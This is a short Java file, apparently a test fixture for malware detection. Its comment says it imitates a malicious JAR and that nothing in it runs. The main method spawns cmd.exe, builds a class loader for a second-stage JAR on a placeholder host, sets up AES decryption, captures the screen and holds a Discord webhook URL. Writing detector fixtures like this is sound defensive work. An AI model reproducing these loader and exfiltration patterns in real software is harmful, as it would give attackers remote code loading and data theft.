package demo;

import java.net.URL;
import java.net.URLClassLoader;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/** Fixture de teste: comportamento tipico de um JAR malicioso. Nada daqui e executado. */
public class Principal {
    public static void main(String[] args) throws Exception {
        Runtime.getRuntime().exec(new String[] {"cmd.exe", "/c", "calc"});
        URLClassLoader loader =
                new URLClassLoader(new URL[] {new URL("http://carga.exemplo.test/stage2.jar")});
        byte[] raw = Base64.getDecoder().decode("QUJDREVGR0hJSktMTU5PUA==");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(raw, "AES"));
        new java.awt.Robot().createScreenCapture(new java.awt.Rectangle(0, 0, 1, 1));
        String hook = "https://discord.com/api/webhooks/123/abcdef";
        System.out.println(loader + hook);
    }
}
